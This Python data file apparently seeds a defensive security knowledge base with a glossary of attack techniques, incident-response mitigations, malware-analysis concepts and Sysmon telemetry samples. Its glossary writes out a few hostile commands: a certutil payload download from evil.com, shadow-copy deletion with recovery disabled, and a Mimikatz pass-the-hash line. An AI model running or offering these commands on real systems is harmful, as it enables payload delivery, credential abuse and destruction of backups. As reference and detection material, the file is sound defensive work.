"""
Comprehensive Knowledge Base Corpus for Glossary, Mitigations, Malware Analysis Concepts, and Telemetry Hub.
"""

GLOSSARY_DATA = [
    {
        "term": "BYOVD (Bring Your Own Vulnerable Driver)",
        "category": "Defenses & Evasion",
        "definition": "Technique where threat actors drop and load legitimately signed third-party Windows kernel drivers containing known vulnerabilities to achieve Ring 0 code execution and terminate EDR/AV processes.",
        "technical_example": "BlackByte and RobbinHood dropped signed gdrv.sys or RTCore64.sys to patch kernel memory and disable Microsoft Defender callbacks.",
        "related_mitre": "T1068",
        "references": ["https://attack.mitre.org/techniques/T1068/"]
    },
    {
        "term": "Process Hollowing (RunPE)",
        "category": "Execution & Evasion",
        "definition": "Code injection technique where an adversary spawns a legitimate executable in a suspended state, unmaps its original image section using NtUnmapViewOfSection, writes malicious payload bytes into the memory space, and resumes the thread.",
        "technical_example": "REvil and Agent Tesla frequently hollow svchost.exe or explorer.exe to conceal network beaconing within legitimate process names.",
        "related_mitre": "T1055.012",
        "references": ["https://attack.mitre.org/techniques/T1055/012/"]
    },
    {
        "term": "LOLBAS (Living Off The Land Binaries and Scripts)",
        "category": "Execution & Persistence",
        "definition": "The malicious use of legitimate, pre-installed operating system utilities (such as certutil.exe, mshta.exe, bitsadmin.exe, wmic.exe) to execute code, download payloads, or evade application whitelisting.",
        "technical_example": "certutil.exe -urlcache -split -f http://evil.com/payload.exe payload.exe",
        "related_mitre": "T1218",
        "references": ["https://lolbas-project.github.io/"]
    },
    {
        "term": "DGA (Domain Generation Algorithm)",
        "category": "Command & Control",
        "definition": "Algorithmic routine implemented in malware to dynamically compute large numbers of pseudorandom domain names based on seeds like the current date. The operator registers only one or two domains daily to establish resilient C2.",
        "technical_example": "Emotet, Conficker, and SUNBURST utilized DGA queries to defeat static domain blacklists and firewall blocking.",
        "related_mitre": "T1568.002",
        "references": ["https://attack.mitre.org/techniques/T1568/002/"]
    },
    {
        "term": "Reflective DLL Injection",
        "category": "Execution & Evasion",
        "definition": "Technique developed by Stephen Fewer allowing a DLL to load itself into a target process's memory space without relying on the Windows LoadLibrary API, thereby evading file-on-disk monitors and standard API hooks.",
        "technical_example": "Cobalt Strike Beacon and Metasploit payloads execute reflectively inside host memory spaces.",
        "related_mitre": "T1055.001",
        "references": ["https://attack.mitre.org/techniques/T1055/001/"]
    },
    {
        "term": "Mutex (Mutual Exclusion Object)",
        "category": "Artifacts",
        "definition": "A synchronization primitive used by software and malware to prevent multiple instances from executing concurrently on the same host machine. Frequently leveraged by defenders as high-confidence IOCs.",
        "technical_example": "WannaCry verified mutex Global\\MsWinZonesCacheCounterMutexA; if present, execution aborted immediately.",
        "related_mitre": "T1106",
        "references": ["https://attack.mitre.org"]
    },
    {
        "term": "Shadow Copy Deletion",
        "category": "Impact",
        "definition": "Command issued by ransomware operators to eliminate Volume Shadow Copies and system restore points, preventing victims from restoring modified files without paying extortion ransoms.",
        "technical_example": "vssadmin.exe delete shadows /all /quiet && bcdedit /set {default} recoveryenabled No",
        "related_mitre": "T1490",
        "references": ["https://attack.mitre.org/techniques/T1490/"]
    },
    {
        "term": "Kerberoasting",
        "category": "Credential Access",
        "definition": "Active Directory attack where an authenticated user requests Kerberos service tickets (TGS) for service accounts with registered Service Principal Names (SPNs), extracting and cracking the ticket hashes offline.",
        "technical_example": "Adversaries extract RC4_HMAC hashes using Rubeus and crack plaintext passwords using Hashcat mode 13100.",
        "related_mitre": "T1558.003",
        "references": ["https://attack.mitre.org/techniques/T1558/003/"]
    },
    {
        "term": "Pass-the-Hash (PtH)",
        "category": "Lateral Movement",
        "definition": "Lateral movement technique where an attacker authenticates to remote servers or services using the captured NTLM hash of a user rather than cracking the cleartext password.",
        "technical_example": "Mimikatz sekurlsa::pth /user:Administrator /domain:CORP /ntlm:HASH /run:cmd.exe",
        "related_mitre": "T1550.002",
        "references": ["https://attack.mitre.org/techniques/T1550/002/"]
    },
    {
        "term": "Intermittent Encryption",
        "category": "Impact & Evasion",
        "definition": "Modern ransomware technique where the encryptor encrypts only every N-th byte block or alternating segments of a targeted file, dramatically speeding up execution time and bypassing heuristics.",
        "technical_example": "Play Ransomware, Black Basta, and Qilin encrypt 50% or 10% blocks to encrypt multi-terabyte drives in minutes.",
        "related_mitre": "T1486",
        "references": ["https://attack.mitre.org/techniques/T1486/"]
    },
    {
        "term": "API Hooking & EDR Unhooking",
        "category": "Defenses & Evasion",
        "definition": "Technique where malware restores the pristine, unmodified bytes of native Windows system DLLs (ntdll.dll, kernel32.dll) from disk to overwrite EDR user-mode inline hooks (jmp instructions).",
        "technical_example": "Direct System Calls via Hell's Gate or SysWhispers execute Ring 0 transitions without passing through hooked ntdll wrappers.",
        "related_mitre": "T1562.001",
        "references": ["https://attack.mitre.org/techniques/T1562/001/"]
    },
    {
        "term": "Tor Onion Routing C2",
        "category": "Command & Control",
        "definition": "Routing command and control communications through the Tor decentralized onion network, masking the true physical hosting IP address and country of adversary infrastructure.",
        "technical_example": "SystemBC, LockBit 3.0, and BlackCat host negotiation portals and heartbeat servers on .onion v3 hidden services.",
        "related_mitre": "T1090.003",
        "references": ["https://attack.mitre.org/techniques/T1090/003/"]
    }
]

MITIGATIONS_DATA = [
    {
        "slug": "phase-prevention-identity-perimeter",
        "phase": "Prevention",
        "title": "Phishing-Resistant MFA & Attack Surface Reduction",
        "objective": "Prevent initial compromise via stolen credentials, password spraying, and remote service exploitation.",
        "technical_controls": "1. Mandate FIDO2/WebAuthn phishing-resistant multi-factor authentication across all VPN, RDP, and SaaS portals.\n2. Disable legacy authentication protocols (NTLMv1, POP3, IMAP) in Microsoft 365.\n3. Close exposed internet-facing management ports (RDP 3389, SMB 445, SSH 22) and place behind Zero Trust Network Access (ZTNA).\n4. Enforce AppLocker/WDAC application control in block mode on corporate endpoints.",
        "target_environment": "Enterprise IT, Cloud Identity, Perimeter Gateways"
    },
    {
        "slug": "phase-detection-continuous-monitoring",
        "phase": "Detection",
        "title": "Endpoint Behavioral Telemetry & Centralized SIEM Ingestion",
        "objective": "Detect adversary operations within minutes of execution before ransomware encryption or data exfiltration occurs.",
        "technical_controls": "1. Deploy Sysmon or EDR sensor across 100% of Windows, Linux, and ESXi hosts.\n2. Ingest Sysmon Event ID 1 (Process Creation with Command Line), Event ID 3 (Network), and Event ID 7 (Image Load).\n3. Implement Sigma rules targeting LOLBAS executions (certutil, powershell -enc, vssadmin, mshta).\n4. Establish baseline alerting for volumetric outbound HTTPS egress during off-business hours.",
        "target_environment": "SOC, SIEM, EDR, Network Sensors"
    },
    {
        "slug": "phase-containment-lateral-isolation",
        "phase": "Containment",
        "title": "Network Microsegmentation & Host Isolation",
        "objective": "Halt lateral movement traversal across administrative subnets and prevent IT infections from impacting OT environments.",
        "technical_controls": "1. Isolate compromised endpoints via EDR network containment APIs immediately upon alert validation.\n2. Enforce strict Layer 3/4 firewall rules between corporate enterprise subnets and OT/SCADA networks.\n3. Block lateral workstation-to-workstation SMB (port 445) and RPC communication via host-based Windows Defender Firewall.\n4. Revoke Kerberos TGT tickets and trigger automated password resets for compromised domain administrator accounts.",
        "target_environment": "Active Directory, Internal Firewalls, OT Segments"
    },
    {
        "slug": "phase-eradication-credential-forensics",
        "phase": "Eradication",
        "title": "Adversary Eviction & Persistence Removal",
        "objective": "Completely purge malware backdoors, implants, and adversary presence from internal systems.",
        "technical_controls": "1. Re-image compromised virtual machines and bare-metal hosts from trusted Golden Master images.\n2. Terminate rogue scheduled tasks, WMI event subscriptions, and registry Run keys identified in incident timeline.\n3. Rotate the Active Directory krbtgt account password twice with a 24-hour interval to invalidate all forged Golden Tickets.\n4. Re-issue compromised SSL/TLS and SAML signing certificates.",
        "target_environment": "Identity Providers, Server Infrastructure"
    },
    {
        "slug": "phase-recovery-immutable-backups",
        "phase": "Recovery",
        "title": "Air-Gapped & Immutable Backup Restoration",
        "objective": "Restore critical operational systems without paying extortion ransoms or risking re-infection.",
        "technical_controls": "1. Maintain offline, air-gapped, or cloud object-locked immutable backups (WORM storage).\n2. Test restoration pipelines quarterly to verify RTO (Recovery Time Objective) and RPO (Recovery Point Objective).\n3. Restore data into quarantined sandbox network segments to verify clean binary state before reconnecting to production.\n4. Verify cryptographic hash integrity of restored database files.",
        "target_environment": "Backup Storage, Virtualized Clusters, Storage Arrays"
    },
    {
        "slug": "phase-hardening-kernel-integrity",
        "phase": "Hardening",
        "title": "OS Kernel Hardening & Vulnerable Driver Blocklists",
        "objective": "Eliminate entire classes of privilege escalation and kernel manipulation attacks.",
        "technical_controls": "1. Enable Windows Credential Guard (LSA Protection) to prevent LSASS process memory dumping by Mimikatz.\n2. Enforce Microsoft Vulnerable Driver Blocklist (HVCI / Memory Integrity) in Windows Security Settings.\n3. Disable SMBv1 and PowerShell v2 across all operating system images.\n4. Enable Local Administrator Password Solution (Windows LAPS) with unique rotated passwords per workstation.",
        "target_environment": "Endpoint Operating Systems, Group Policy, Intune"
    }
]

ANALYSIS_CONCEPTS_DATA = [
    {
        "slug": "pe-portable-executable-architecture",
        "category": "PE Characteristics",
        "title": "Portable Executable (PE32/PE32+) Structural Forensics",
        "technical_overview": "The standard file format for Windows executables, DLLs, and kernel drivers. Key headers include IMAGE_DOS_HEADER (MZ signature), IMAGE_NT_HEADERS (PE signature), IMAGE_FILE_HEADER (machine type, timestamp), and IMAGE_OPTIONAL_HEADER (AddressOfEntryPoint, ImageBase, Subsystem).",
        "forensic_indicators": "1. High entropy (>7.2) indicating packing or encryption.\n2. Suspicious compile timestamps (epoch 0, or future dates).\n3. Missing rich headers or mismatched machine architectures.\n4. Unusual entry point pointing directly into the .rsrc or .data section.",
        "investigation_tooling": "PEStudio, CFF Explorer, Detect It Easy (DiE), Ghidra, pefile (Python)"
    },
    {
        "slug": "elf-executable-and-linkable-format",
        "category": "ELF Characteristics",
        "title": "Executable and Linkable Format (ELF) Linux & IoT Malware Analysis",
        "technical_overview": "Standard format for Linux and embedded architectures (ARM, MIPS, x86_64). Composed of ELF header, Program Header Table (defining memory segments), and Section Header Table (defining symbols and linking).",
        "forensic_indicators": "1. Statically compiled stripped binaries (lacking .symtab and .strtab) common in botnets (Mirai, Gafgyt).\n2. UPX-packed ELF binaries with altered p_flags headers.\n3. Embedded raw socket manipulation routines (SOCK_RAW) for SYN flood engine creation.",
        "investigation_tooling": "readelf, objdump, Ghidra, IDA Pro, checksec"
    },
    {
        "slug": "anti-analysis-and-evasion",
        "category": "Anti-Analysis",
        "title": "Anti-Debugging, Anti-Disassembly & Anti-VM Routines",
        "technical_overview": "Mechanisms designed to detect dynamic analysis environments and alter execution flow to appear benign. Checks include IsDebuggerPresent(), NtQueryInformationProcess (ProcessDebugPort), RDTSC timing checks, and hypervisor registry checks (VMware, VirtualBox, QEMU).",
        "forensic_indicators": "1. Execution of CPUID instruction checking hypervisor bit.\n2. Querying screen resolution (aborts if <1024x768) or checking mouse cursor movement delta.\n3. Exception handling abuse (SEH/VEH) and INT 3/INT 2D breakpoint scanning.",
        "investigation_tooling": "ScyllaHide, x64dbg with evasion plugins, Cuckoo Sandbox, CAPEv2"
    },
    {
        "slug": "packing-and-crypters",
        "category": "Packing & Obfuscation",
        "title": "Runtime Packing, Polymorphism & Stub Architecture",
        "technical_overview": "Technique where the original binary payload is compressed or encrypted and embedded within a generic loader stub. At runtime, the stub allocates memory with VirtualAlloc(PAGE_EXECUTE_READWRITE), decrypts the payload into memory, and jumps to its original entry point (OEP).",
        "forensic_indicators": "1. Section names like .upx, .mpress, or non-standard section names with execute and write permissions (WX).\n2. Tiny Import Address Table (IAT) containing only LoadLibraryA and GetProcAddress.\n3. Memory dumping at OEP reveals clean un-obfuscated MZ executable.",
        "investigation_tooling": "Detect It Easy, OllyDump, Scylla, Volatility malfind plugin"
    }
]

TELEMETRY_DATA = [
    {
        "source_type": "Sysmon",
        "event_id": "Event ID 1",
        "name": "Process Creation with Command Line",
        "description": "Logs every process launch, including parent process, process GUID, command-line arguments, hashes, and user token.",
        "detection_value": "Critical for detecting LOLBAS executions, encoded PowerShell commands, and child processes spawned by MS Office or web servers (w3wp.exe -> cmd.exe).",
        "sample_log": "Image: C:\\Windows\\System32\\vssadmin.exe | CommandLine: vssadmin delete shadows /all /quiet | ParentImage: C:\\Windows\\explorer.exe"
    },
    {
        "source_type": "Sysmon",
        "event_id": "Event ID 3",
        "name": "Network Connection Detected",
        "description": "Logs outbound and inbound TCP/UDP socket connections with initiated process path, source/destination IP, and destination port.",
        "detection_value": "Detects C2 beaconing check-ins over ports 443, 80, 8080, and named pipe lateral movement.",
        "sample_log": "Image: C:\\Users\\victim\\AppData\\Local\\Temp\\beacon.exe | DestinationIp: 185.220.101.45 | DestinationPort: 443 | Protocol: tcp"
    },
    {
        "source_type": "Sysmon",
        "event_id": "Event ID 8",
        "name": "CreateRemoteThread Injection",
        "description": "Logs when a process spawns a thread inside the virtual memory address space of a separate external process.",
        "detection_value": "High-fidelity indicator of DLL injection, process hollowing, and Cobalt Strike Beacon migration into explorer.exe or svchost.exe.",
        "sample_log": "SourceImage: C:\\Temp\\loader.exe | TargetImage: C:\\Windows\\System32\\svchost.exe | StartAddress: 0x00007FFB32101000"
    },
    {
        "source_type": "Sysmon",
        "event_id": "Event ID 11",
        "name": "FileCreate Event",
        "description": "Logs file creation operations on disk, recording file path, creation time, and creating process.",
        "detection_value": "Detects ransomware dropping ransom notes (e.g. read_me.txt) or dropping secondary payloads into AppData\\Roaming.",
        "sample_log": "Image: C:\\Temp\\lockbit.exe | TargetFilename: C:\\Users\\victim\\Desktop\\README_RESTORE.txt"
    },
    {
        "source_type": "Windows Security Event Log",
        "event_id": "Event ID 4624",
        "name": "Successful Account Logon",
        "description": "Records logon sessions with Logon Type (Type 2 Interactive, Type 3 Network, Type 10 RemoteInteractive RDP).",
        "detection_value": "Identifies lateral movement via RDP (Logon Type 10) or SMB (Logon Type 3) using stolen domain administrator credentials.",
        "sample_log": "LogonType: 10 | TargetUserName: Administrator | IpAddress: 192.168.1.150 | WorkstationName: ATTACKER-HOST"
    },
    {
        "source_type": "Windows Security Event Log",
        "event_id": "Event ID 7045",
        "name": "A New Service Was Installed",
        "description": "System event recorded when a new Windows Service is registered on the host.",
        "detection_value": "Critical persistence indicator; detects tools like PsExec creating PSEXESVC or ransomware installing persistence services.",
        "sample_log": "ServiceName: mssecsvc2.0 | ServiceFileName: C:\\Windows\\tasksche.exe | ServiceType: user mode service"
    }
]
